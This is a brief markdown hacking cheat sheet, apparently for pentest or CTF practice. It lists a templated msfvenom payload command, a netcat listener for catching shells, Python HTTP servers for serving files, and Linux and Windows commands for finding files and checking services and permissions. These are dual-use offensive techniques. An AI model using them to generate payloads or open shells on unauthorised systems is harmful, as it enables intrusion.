# info-hacking-cheat-sheet

## msfvenom

create payload
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FILE_TYPE> -o <OUTPUT>
```


## netcat

run server

```bash
nc -lvnp 6666
```

## python

run server python3

```bash
python3 -m http.server 6666
```

run server python3

```bash
python -m SimpleHTTPServer 6666
```

## linux

find by filename
```bash
find / -type f -name "<PART_OF_FILE_NAME>" 2>/dev/null
```

## windows

find service by part of name and view information

```bash
sc query | findstr /i "<PART_OF_SERVICE_NAME>"
sc qc <SERVICE_NAME>
```

check perm

```bash
icacls <FILE_NAME>
```
